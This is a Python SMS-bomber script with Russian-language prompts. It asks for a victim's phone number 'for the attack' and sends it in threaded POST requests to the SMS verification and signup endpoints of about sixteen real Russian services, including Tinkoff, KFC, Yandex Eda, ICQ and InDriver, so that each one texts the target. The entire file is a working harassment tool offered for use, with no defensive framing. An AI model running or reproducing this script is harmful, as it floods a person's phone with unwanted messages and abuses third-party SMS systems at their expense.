import requests
import threading
from colorama import Fore, Style
from random import choice

logo = ('''

╔╗────╔═╗╔╗────────╔╗───────
║╚╗╔═╗║╬║║╚╗╔═╗╔══╗║╚╗╔═╗╔╦╗
║╔╣║╬║║╔╝║╬║║╬║║║║║║╬║║╩╣║╔╝
╚═╝╚═╝╚╝─╚═╝╚═╝╚╩╩╝╚═╝╚═╝╚╝─
''')
print(logo)
_phone = input(
    'Здравствуйте! Введите номер для атаки например:7##########==> ')

speed = int(input('Введите скорость(1 - 2): '))

if speed != 1 and speed != 2:
    raise Exception("СКОРОСТЬ ОТ 1 ДО 2")


if _phone[0] == '+':
    _phone = _phone[1:]
if _phone[0] == '8':
    _phone = '7' + _phone[1:]
if _phone[0] == '9':
    _phone = '7' + _phone

_name = ''
password = ''
username = ''
passmegafon = ''
symbols = list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')
for x in range(12):
    _name = _name + choice(symbols)
    password = _name + choice(symbols)
    username = _name + choice(symbols)
    passmegafon = passmegafon + choice(list('123456789'))

_phone9 = _phone[1:]


def bomb():
    _email = _name + choice(symbols) + '@gmail.com'
    email = _name + choice(symbols) + '@gmail.com'

    try:
        req = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html',
                            data={'l': _phone9})
        print(Fore.GREEN + '[+] RuTaxi отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + '[-] [RuTaxi] Не отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
        print(e)

    try:
        req = requests.post('https://api.tinkoff.ru/v1/sign_up',
                            data={'phone': '+' + _phone}, headers={}, timeout=2)
        print(Fore.GREEN + '[+] Tinkoff отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + '[-] [Tinkoff] Не отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
        print(e)

    try:
        req = requests.post('https://youla.ru/web-api/auth/request_code',
                            data={'phone': _phone}, timeout=2)
        print(Fore.GREEN + '[+] Youla отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + '[-] [Youla] Не отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
        print(e)

    try:
        req = requests.post(
            'https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone}, timeout=2)
        print(Fore.GREEN + '[+] Sunlight отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + '[-] [Sunlight] Не отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
        print(e)

    try:
        req = requests.post('https://online.sbis.ru/reg/service/', json={
            'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика', 'params': {'phone': _phone},
            'id': '1'}, timeout=2)
        print(Fore.GREEN + '[+] Sberbank отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + '[-] [Sberbank] Не отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
        print(e)

    try:
        req = requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
                            json={'phone': '+' + _phone}, timeout=2)
        print(Fore.GREEN + '[+] KFC отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + '[-] [KFC] Не отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
        print(e)

    try:
        req = requests.post("https://api.carsmile.com/", json={"operationName": "enterPhone", "variables": {
            "phone": _phone}, "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"},
            timeout=2)
        print(Fore.GREEN + '[+] carsmile отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + '[-] [carsmile] Не отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
        print(e)

    try:
        req = requests.post("https://api.delitime.ru/api/v2/signup",
                            data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3}, timeout=2)
        print(Fore.GREEN + '[+] Delitime отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + '[-] [Delitime] Не отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
        print(e)

    try:
        req = requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={
            'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1', "k": "ic1rtwz1s1Hj1O0r",
            "r": "46763"}, timeout=2)
        print(Fore.GREEN + '[+] ICQ отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + '[-] [ICQ] Не отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
        print(e)

    try:
        req = requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={
            "mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0, "v": 3,
            "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"}, timeout=2)
        print(Fore.GREEN + '[+] InDriver отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + '[-] [InDriver] Не отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
        print(e)

    try:
        req = requests.post(
            "https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone}, timeout=2)
        print(Fore.GREEN + '[+] IVI отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + '[-] [IVI] Не отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
        print(e)

    try:
        req = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                            data={"st.r.phone": "+" + _phone}, timeout=2)
        print(Fore.GREEN + '[+] OK отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + '[-] [OK] Не отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
        print(e)

    try:
        req = requests.post(
            "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone}, timeout=2)
        print(Fore.GREEN + '[+] qlean отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + '[-] [qlean] Не отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
        print(e)

    try:
        req = requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                            json={"phone_number": "+" + _phone}, timeout=2)
        print(Fore.GREEN + '[+] Eda.Yandex отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + '[-] [Eda.Yandex] Не отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
        print(e)

    try:
        req = requests.post('https://youla.ru/web-api/auth/request_code',
                            data={'phone': _phone}, timeout=2)
        print(Fore.GREEN + '[+] Youla отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + '[-] [Youla] Не отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
        print(e)

    try:
        req = requests.post(
            "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone}, timeout=2)
        print(Fore.GREEN + '[+] anytime отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + '[-] [anytime] Не отправлено! ' +
              str(req.status_code) + Style.RESET_ALL)
        print(e)


threads = []

for i in range(speed):
    t = threading.Thread(target=bomb)
    t.daemon = True
    threads.append(t)

for i in range(speed):
    threads[i].start()

for i in range(speed):
    threads[i].join()
